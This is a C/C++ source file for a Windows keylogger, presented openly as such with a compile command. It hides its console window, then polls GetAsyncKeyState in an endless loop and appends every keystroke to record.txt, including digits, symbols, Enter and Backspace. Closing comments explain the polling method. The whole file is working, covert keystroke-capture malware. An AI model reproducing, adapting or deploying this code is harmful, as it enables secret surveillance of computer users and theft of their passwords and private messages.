/*######################################################################################
# Dev: cnd.dev
# Program Name: keylogger
# Version: 1.0.0
#  - Major.Minor.Update/BuildNumber
# Date: 201528OCT25
# Filename: keylogger.c
# Dependency: N/A
# Compile Cmd: g++ -m64 -O1 keylogger.c -o keylogger-v1.0.0-win-x86-64
# Synopsis:
#  - Overview: describes what the program does, how it works, and its key components
#  - Technical: ...
######################################################################################*/


#include <windows.h>
#include <winuser.h>
#include <fstream>
using namespace std;

void hideWindow() {
	HWND hidden;
	AllocConsole();
	hidden = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(hidden, 0);
}

void logging() {
	char key;

	while (true) {
		//Read US Keyboard ASCII Characters - currently set up to take uppercase NOT lowercase
		for (key = 8; key <= 127; key++) {
			// if key is pressed (from up to down)
			if (GetAsyncKeyState(key) == -32767) {
				//ios::app opens the file in append mode
				ofstream write("record.txt", ios::app);

				//if shift key (left or right) is pressed AND uppercase A-Z is pressed, then capture the lowercase equivalent
				if ((key >= 65 && key <= 90) && !(GetAsyncKeyState(0x10))) {
					key += 32;   // change upper to lowercase
					write << key;
					write.close();
					break;
				}

				//if no shift key is pressed, then capture uppercase
				else if (key >= 65 && key <= 90) {
					write << key;
					write.close();
					break;
				}

				//
				else {
					switch (key) {
						case 48: {
							if (GetAsyncKeyState(0x10))
								write << ")";
							else
								write << "0";
							break;
						}
						case 49: {
							if (GetAsyncKeyState(0x10))
								write << "!";
							else
								write << "1";
							break;
						}
						case 50: {
							if (GetAsyncKeyState(0x10))
								write << "@";
							else
								write << "2";
							break;
						}
						case 51: {
							if (GetAsyncKeyState(0x10))
								write << "#";
							else
								write << "3";
							break;
						}
						case 52: {
							if (GetAsyncKeyState(0x10))
								write << "$";
							else
								write << "4";
							break;
						}
						case 53: {
							if (GetAsyncKeyState(0x10))
								write << "%";
							else
								write << "5";
							break;
						}
						case 54: {
							if (GetAsyncKeyState(0x10))
								write << "^";
							else
								write << "6";
							break;
						}
						case 55: {
							if (GetAsyncKeyState(0x10))
								write << "&";
							else
								write << "7";
							break;
						}
						case 56: {
							if (GetAsyncKeyState(0x10))
								write << "*";
							else
								write << "8";
							break;
						}
						case 57: {
							if (GetAsyncKeyState(0x10))
								write << "(";
							else
								write << "9";
							break;
						}

						//VIRTUAL KEYS NAMED CONSTANTS IN WINDOWS API (windows.h/winuser.h)
						case VK_SPACE: {
							write << " ";
							break;
						}
						case VK_RETURN: {
							write << "\n";
							break;
						}
						case VK_TAB: {
							write << "	";
							break;
						}
						case VK_BACK: {
							write << "[BACKSPACE]";
							break;
						}
						case VK_ESCAPE: {
							write << "[ESC]";
							break;
						}
						case VK_DELETE: {
							write << "[DELETE]";
							break;
						}
					}
				}
			}
		}
	}
}

int main()
{
	hideWindow();
	logging();
	return 0;
}

//sleep(0);
//this sleep function prevents the CPU from maxing out but its not the best solutions
//this pauses the program specified in milliseconds
//putting 0 tells the program to stop using the CPU whenever another program wants to use it

//The GetAsyncKeyState is a system interrupt function checks the current state of a key
//it returns 0 key wasn't pressed since last call and -32767 (0x8001) if key was just pressed (transitioned from up to down) once
// - Think...has the user pressed any keys yet? if yes, then store it in the specified variable then send to file
//the specific simply prevents repeated logging if the user holds a key down - it will only logs a key it's its first

